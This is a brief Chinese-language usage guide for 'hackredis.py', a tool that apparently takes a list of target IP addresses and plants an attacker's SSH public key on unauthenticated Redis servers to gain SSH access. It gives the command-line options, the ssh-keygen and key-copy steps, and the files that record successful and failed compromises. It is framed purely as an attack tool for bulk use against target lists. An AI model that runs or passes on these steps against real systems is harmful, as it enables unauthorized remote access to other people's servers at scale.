使用

  

  

☁  redis  python hackredis.py                                 

usage: hackredis.py \[-h\] \[-l IPLIST\] \[-p PORT\] \[-r ID\_RSAFILE\] \[-sp SSH\_PORT\]

 

For Example:

\-----------------------------------------------------------------------------

python hackredis.py  -l ip.txt -p 6379 -r foo.txt -sp 22

 

optional arguments:

  -h, --help     show this help message and exit

  -l IPLIST      the hosts of target

  -p PORT        the redis default port

  -r ID\_RSAFILE  the ssh id\_rsa file you generate

  -sp SSH\_PORT   the ssh port

  

首先需要ssh密钥:  

  

☁  ~  ssh-keygen -t rsa

☁  ~  cp ~/.ssh/id\_rsa.pub /tmp/foo.txt

  

后将ip列表填入ip.txt，然后就可以跑了。 成功的将会输出到success.txt,执行成功但是ssh连接失败的会存储在unconnect.txt，操作失败的会存储在fail.txt。
